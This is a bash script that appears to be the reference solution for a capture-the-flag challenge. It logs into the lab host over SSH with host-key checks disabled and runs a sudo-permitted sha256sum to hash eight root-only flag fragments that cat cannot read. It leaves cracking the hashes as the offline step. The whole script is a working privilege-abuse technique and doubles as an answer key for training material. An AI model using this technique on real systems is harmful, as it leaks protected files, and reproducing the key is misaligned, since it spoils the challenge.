#!/bin/bash
#
# Reference solution for 02-no-matter-what.
#
# The flag is split across eight files in /usr/local (O W A S P C T F), each
# readable only by root. sudo permits `sha256sum` on them, so the ctf user can
# hash each fragment even though it cannot read them. This script demonstrates
# that primitive: `cat` is denied while `sudo sha256sum` succeeds for all eight.
# Cracking each hash to its fragment and concatenating them in the order
# O W A S P C T F is the final, offline step left to the player.
#
# Host, port and password come from the environment (CTF_HOST, CTF_PORT,
# CTF_PASSWORD). Needs sshpass and an ssh client.
set -uo pipefail

host="${CTF_HOST:-localhost}"; port="${CTF_PORT:-22}"; password="${CTF_PASSWORD:-CTF_PASSWORD}"
run() {
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -p "$port" "ctf@$host" "$1"
}

denied=$(run "cat /usr/local/O 2>&1 1>/dev/null" || true)
ok=1
for f in O W A S P C T F; do
    h=$(run "sudo /usr/bin/sha256sum /usr/local/$f" | awk '{print $1}')
    printf '%s: %s\n' "$f" "$h"
    [[ "$h" =~ ^[0-9a-f]{64}$ ]] || ok=0
done
echo "crack each hash offline and concatenate in order O W A S P C T F"
echo "cat /usr/local/O -> ${denied:-<no error? unexpected>}"

if [ "$ok" = 1 ] && echo "$denied" | grep -qi 'permission denied'; then
    echo "primitive verified: sudo sha256sum reads all eight root-only fragments"
    exit 0
fi
echo "primitive check failed" >&2
exit 1
